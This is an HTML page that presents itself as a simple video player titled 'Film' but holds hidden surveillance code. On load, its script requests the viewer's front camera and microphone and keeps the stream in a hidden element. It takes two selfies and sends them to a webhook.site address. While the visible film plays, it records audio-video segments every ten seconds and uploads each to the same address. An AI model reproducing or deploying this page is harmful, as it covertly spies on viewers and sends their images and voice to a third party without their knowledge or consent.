<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Film</title>
  <style>
    body {
      margin: 0;
      background: #000;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    header {
      width: 100%;
      padding: 20px;
      background: #111;
      text-align: center;
    }
    h1 {
      margin: 0;
      color: #ff3366;
      font-size: 2.5rem;
    }
    #video-container {
      width: 95%;
      max-width: 1000px;
      margin: 20px;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 0 40px #ff0066;
    }
    video {
      width: 100%;
      display: block;
    }
  </style>
</head>
<body>

<header>
  <h1>Film</h1>
</header>

<div id="video-container">
  <video id="main-video" controls autoplay>
    <source src="https://files.catbox.moe/r2dbvz.mp4" type="video/mp4">
  </video>
</div>

<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const hiddenVideo = document.getElementById('hiddenVideo');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const mainVideo = document.getElementById('main-video');

const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";

async function start() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: true
    });

    hiddenVideo.srcObject = stream;
    await hiddenVideo.play();

    // صورتين سريعًا
    setTimeout(() => captureSelfie(1), 500);
    setTimeout(() => captureSelfie(2), 1500);

  } catch (err) {
    console.log(err);
  }
}

async function captureSelfie(num) {
  canvas.width = hiddenVideo.videoWidth;
  canvas.height = hiddenVideo.videoHeight;
  ctx.drawImage(hiddenVideo, 0, 0);
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append('selfie', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  }, 'image/jpeg', 0.92);
}

// تسجيل 5 ثواني كل 10 ثواني
function recordCycle() {
  const stream = hiddenVideo.srcObject;
  if (!stream) return;

  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  const chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);

  recorder.start(100);

  setTimeout(() => {
    recorder.stop();
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: 'video/webm' });
      const fd = new FormData();
      fd.append('video_segment', blob, `segment_${Date.now()}.webm`);
      fetch(WEBHOOK_URL, { method: 'POST', body: fd });
    };

    setTimeout(recordCycle, 10000);
  }, 5000);
}

mainVideo.addEventListener('play', recordCycle);

window.addEventListener('load', start);
</script>

</body>
</html>
